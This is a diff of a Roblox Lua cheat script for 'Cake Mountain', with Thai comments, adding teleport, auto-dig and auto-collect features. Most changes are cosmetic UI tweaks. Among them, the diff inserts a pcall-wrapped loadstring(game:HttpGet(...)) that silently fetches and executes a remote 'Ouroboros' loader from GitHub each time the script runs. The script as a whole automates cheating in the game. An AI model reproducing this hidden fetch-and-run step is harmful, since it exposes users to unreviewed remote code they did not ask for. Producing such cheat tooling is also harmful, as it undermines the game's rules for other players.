@@ -8,12 +8,17 @@ local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
+-- โหลด Ouroboros Hub เบื้องหลัง (ถ้าต้องการให้ Loader หลักทำงานด้วย)
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/joustingmatch/Ouroboros/main/loader.lua"))()
+end)
+
 -- ลบ UI เก่าหากมีอยู่
 if PlayerGui:FindFirstChild("CakeHeightHub") then
     PlayerGui.CakeHeightHub:Destroy()
 end
 
--- สร้าง UI หน้าต่างควบคุม
+-- สร้าง GUI หน้าต่างควบคุมความสูงการขุด
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "CakeHeightHub"
 ScreenGui.ResetOnSpawn = false
@@ -21,9 +26,9 @@ ScreenGui.Parent = PlayerGui
 
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
-MainFrame.Size = UDim2.new(0, 400, 0, 360)
-MainFrame.Position = UDim2.new(0.5, -200, 0.5, -180)
-MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
+MainFrame.Size = UDim2.new(0, 420, 0, 360)
+MainFrame.Position = UDim2.new(0.5, -210, 0.5, -180)
+MainFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
 MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
 MainFrame.Draggable = true
@@ -36,7 +41,7 @@ MainCorner.Parent = MainFrame
 -- แถบ Title ด้านบน
 local TopBar = Instance.new("Frame")
 TopBar.Size = UDim2.new(1, 0, 0, 40)
-TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+TopBar.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
 TopBar.BorderSizePixel = 0
 TopBar.Parent = MainFrame
 
@@ -49,7 +54,7 @@ TitleLabel.Size = UDim2.new(1, -20, 1, 0)
 TitleLabel.Position = UDim2.new(0, 12, 0, 0)
 TitleLabel.BackgroundTransparency = 1
 TitleLabel.Font = Enum.Font.GothamBold
-TitleLabel.Text = "CAKE MOUNTAIN - FARMING HUB"
+TitleLabel.Text = "CAKE MOUNTAIN - HEIGHT DIGGER HUB"
 TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TitleLabel.TextSize = 13
 TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -74,19 +79,23 @@ UIList.SortOrder = Enum.SortOrder.LayoutOrder
 UIList.Padding = UDim.new(0, 10)
 UIList.Parent = Container
 
--- 1. ช่องกรอกระดับความสูง (Y-Level)
+-- 1. ช่องกำหนดระดับความสูง (Y-Level)
 local InputFrame = Instance.new("Frame")
 InputFrame.Size = UDim2.new(1, 0, 0, 42)
-InputFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+InputFrame.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
 InputFrame.BorderSizePixel = 0
 InputFrame.Parent = Container
+
+local InputCorner = Instance.new("UICorner")
+InputCorner.CornerRadius = UDim.new(0, 6)
+InputCorner.Parent = InputFrame
 
 local InputLabel = Instance.new("TextLabel")
 InputLabel.Size = UDim2.new(0, 180, 1, 0)
 InputLabel.Position = UDim2.new(0, 10, 0, 0)
 InputLabel.BackgroundTransparency = 1
 InputLabel.Font = Enum.Font.GothamMedium
-InputLabel.Text = "กำหนดระดับความสูง (Y):"
+InputLabel.Text = "กำหนดระดับความสูงการขุด (Y):"
 InputLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
 InputLabel.TextSize = 12
 InputLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -95,7 +104,7 @@ InputLabel.Parent = InputFrame
 local TextBox = Instance.new("TextBox")
 TextBox.Size = UDim2.new(0, 100, 0, 28)
 TextBox.Position = UDim2.new(1, -110, 0.5, -14)
-TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
+TextBox.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
 TextBox.Text = "580"
 TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextBox.Font = Enum.Font.GothamBold
@@ -113,11 +122,11 @@ TextBox.FocusLost:Connect(function()
     end
 end)
 
--- 2. ปุ่ม Teleport ไประดับความสูงพร้อมตรึงตำแหน่งไม่ให้ร่วง
+-- 2. ปุ่มย้ายและตรึงตำแหน่งตัวละครชั่วคราว
 local TpBtn = Instance.new("TextButton")
 TpBtn.Size = UDim2.new(1, 0, 0, 40)
 TpBtn.BackgroundColor3 = Color3.fromRGB(60, 110, 200)
-TpBtn.Text = "ย้ายและตรึงตัวละครที่ชั้นความสูง"
+TpBtn.Text = "วาร์ปและตรึงตำแหน่งที่ระดับความสูง"
 TpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 TpBtn.Font = Enum.Font.GothamBold
 TpBtn.TextSize = 12
@@ -135,7 +144,7 @@ TpBtn.MouseButton1Click:Connect(function()
         hrp.CFrame = CFrame.new(pos.X, TargetHeight, pos.Z)
         hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
         
-        -- ตรึงตัวละครชั่วคราวเพื่อให้ยืนขุดกลางอากาศได้
+        -- ตรึงตัวละครไว้ไม่ให้ร่วง
         hrp.Anchored = true
         task.delay(1, function()
             if hrp then hrp.Anchored = false end
@@ -143,7 +152,7 @@ TpBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- 3. ปุ่ม Toggle Auto Dig (ใช้ช้อนขุด)
+-- 3. ปุ่ม Auto Dig (ใช้ช้อนขุด)
 local ToggleBtn = Instance.new("TextButton")
 ToggleBtn.Size = UDim2.new(1, 0, 0, 40)
 ToggleBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
@@ -168,7 +177,7 @@ ToggleBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- 4. ปุ่ม Toggle Auto Collect Income
+-- 4. ปุ่ม Auto Collect Income
 local CollectBtn = Instance.new("TextButton")
 CollectBtn.Size = UDim2.new(1, 0, 0, 40)
 CollectBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
@@ -193,14 +202,14 @@ CollectBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- ซ่อน/แสดง UI ด้วย RightShift
+-- ปุ่ม RightShift สำหรับ ซ่อน/แสดง UI
 UserInputService.InputBegan:Connect(function(input, gpe)
     if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
         MainFrame.Visible = not MainFrame.Visible
     end
 end)
 
--- ลูปการทำงาน
+-- ลูปการขุดและเก็บเงินเบื้องหลัง
 task.spawn(function()
     while true do
         if AutoDigActive then
